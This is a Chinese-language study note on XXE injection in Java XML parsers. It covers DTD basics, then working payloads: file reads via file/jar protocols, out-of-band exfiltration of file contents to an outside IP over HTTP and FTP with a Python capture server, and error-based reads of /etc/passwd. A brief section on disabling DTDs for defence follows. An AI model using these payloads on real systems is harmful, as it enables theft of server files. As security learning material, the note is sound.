# 基础知识

## XML基础

XML外部实体注入 （XML External Entity Injection，以下简称XXE注入）是一种针对解析XML文档的应用程序的注入类型攻击。当恶意用户在提交一个精心构造的包含外部实体引用的XML文档给未正确配置的XML解析器处理时，该攻击就会发生。XXE注入可能造成敏感信息泄露、拒绝服务、SSRF、命令执行等危害。

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

```xml-dtd
<!--XML申明-->
<?xml version="1.0"?> 

<!--文档类型定义-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]>

<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

以上 DTD 解释如下：

- !DOCTYPE note (第二行)定义此文档是 note 类型的文档。
- !ELEMENT note (第三行)定义 note 元素有四个元素："to、from、heading,、body"
- !ELEMENT to (第四行)定义 to 元素为 "#PCDATA" 类型
- !ELEMENT from (第五行)定义 from 元素为 "#PCDATA" 类型
- !ELEMENT heading (第六行)定义 heading 元素为 "#PCDATA" 类型
- !ELEMENT body (第七行)定义 body 元素为 "#PCDATA" 类型 

PCDATA 的意思是被解析的字符数据（parsed character data）。

CDATA 的意思是字符数据（character data）。不会被解析器解析。

由于xxe漏洞只与DTD文档类型定义有关，下面开始只需要关注DTD即可。

## DTD

全称为XML Document Type Declaration。根据其声明位置可分为内部DTD和外部DTD。When a DTD is declared within the file it is called **Internal DTD** and if it is declared in a separate file it is called **External DTD**.

Basic syntax of a DTD:

```xml-dtd
<!DOCTYPE element DTD identifier
[
   declaration1
   declaration2
   ........
]>
```

如今的xxe漏洞攻击中主要用到的是外部DTD。

External DTD

example.xml:

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

note.dtd

```xml-dtd
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机

```xml-dtd
<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">

<author>&writer;©right;</author>
```



# 常见攻击方式

## 读文件、目录（有回显

### file协议

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
<!ENTITY file SYSTEM "file:///e://flag">
]>
<xml>
<xxe>&file;</xxe>
</xml>
```

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240610205200.png)

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240610210738.png)

注：元素标签不是固定的，只要是正确格式均可。如:

```xml-dtd
<data>
<content>&file;</content>
</data>
```

### netdoc协议

file:///可用netdoc:/代替

### jar协议

```
jar:{url}!{path}
```

用于从url中下载压缩包解压文件

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
<!ENTITY file SYSTEM "jar:http://127.0.0.1:8081/2.zip!/2.txt">
]>
<xml>
<xxe>&file;</xxe>
</xml>
```





## 基于OOB的盲读文件（无回显

在服务器上创建evil.xml

```xml-dtd
<!ENTITY % file SYSTEM 'file:///e://flag'>
<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'http://111.231.25.127:8081/?content=%file;'>">
%payload;
%send;

<!ENTITY % file SYSTEM 'file:///e://flag'>
<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'ftp://111.231.25.127:8083/%file;'>">
%payload;
%send;
```

burp构造：

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://111.231.25.127:8080/evil.xml">
%remote;]>
```

在8081端口监听：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240612210438.png)

这个evil.xml似乎是send外面套了一层payload，是可以去掉payload的。

此外，可以用base64编码来读取文件，以避免特殊字符引起的语法解析错误。

`<!ENTITY bee SYSTEM "php://filter/read=convert.base64-encode/resource=file:///d:/robots.txt">`

### 盲读文件的限制(ftp)

盲读文件的时候，使用nc接受数据只能是对应的文件只有一行。如果文件中包含了`\r`，`\n`等字符的时候，会报错：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240614163559.png)

但是可以用ftp协议代替http协议（**jdk<7u141和jdk<8u162**）

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240614173054.png)

evil.xml

```xml-dtd
<!ENTITY % file SYSTEM 'file:///e://flag'>
<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'ftp://111.231.25.127:8083/%file;'>">
%payload;
%send;
```

用python实现简单的FTP服务器

```python
import socket
import threading

def handle_client(client_socket):
    print("New client connected")
    client_socket.sendall(b"220 xxe-ftp-server\r\n")
    while True:
        req = client_socket.recv(1024).decode('utf-8')
        print("< " + req)
        if "USER" in req:
            client_socket.sendall(b"331 password please - version check\r\n")
        else:
            client_socket.sendall(b"230 more data please!\r\n")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 39802))
    server.listen(5)
    print("Server listening on port 8083")
    while True:
        client_socket, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    main()
```

## Error Based XXE

在高版本Java且需要盲注的情况下，唯一的解决办法就是Error Based XXE，前提是服务器开启了报错。

总的来说有三种方法：

1.利用操作系统上已有的dtd文件。比如Docker官方openjdk镜像，其安装了fontconfig-config这个包，这个包就包含一个dtd文件/usr/share/xml/fontconfig/fonts.dtd：

```xml-dtd
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message>any text</message>
```

本地dtd文件在这里的作用是：如果无回显且服务器不允许请求远程服务器上的dtd文件，那么就可以使用本地文件，去redefine其中的参数实体，再结合报错实现回显。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240614205350.png)

2.利用应用内部的dtd文件。比如比如Solr依赖的lucene-queryparser.jar中包含的LuceneCoreQuery.dtd：

```xml-dtd
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "jar:file:///opt/solr/server/solr-webapp/webapp/WEB-INF/lib/lucene-queryparser-7.0.1.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">

    <!ENTITY % queries 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message>any text</message>
```

3.利用远程dtd文件（出网）

```xml-dtd
#服务器上放一个dtd

<!ENTITY % test "example">
<!ELEMENT pattern (%test;)>

```

```xml-dtd
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "http://evil.host.name/include.dtd">

    <!ENTITY % test 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message>any text</message>
```

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240616161321.png)

## 有回显读文件的限制

无回显外带的时候遇到下面这种情况无法解决

遇到这些字符的时候需要使用CDATA：

```
'  "   <   >   &
```

CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data），CDATA 部分中的所有内容都会被解析器忽略。CDATA 部分由`<![CDATA[`开始，由`]]>`结束。

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
<!ENTITY % start "<![CDATA[">
<!ENTITY % stuff  SYSTEM "file:///d://flag">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://xx.xx.xx.xx:080/cdata.dtd">
%dtd;
]>
<xml>
<xxe>&all;</xxe>
</xml>
```

```
root@VM-0-6-ubuntu:~/java/xxe# cat cdata.dtd
<!ENTITY all "%start;%stuff;%end;">
```

但是此时对于单独的`&`仍然没办法。

# 防御XXE

1.DocumentBuilderFactory

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

2.替他方式见如下链接：

https://blog.spoock.com/2018/10/23/java-xxe/

# 参考链接

https://zhuanlan.zhihu.com/p/700860965

https://xz.aliyun.com/t/10774
https://github.com/bfengj/CTF/blob/main/Web/java/XXE/Java%E4%B8%AD%E7%9A%84XXE.md

https://blog.spoock.com/2018/10/23/java-xxe/

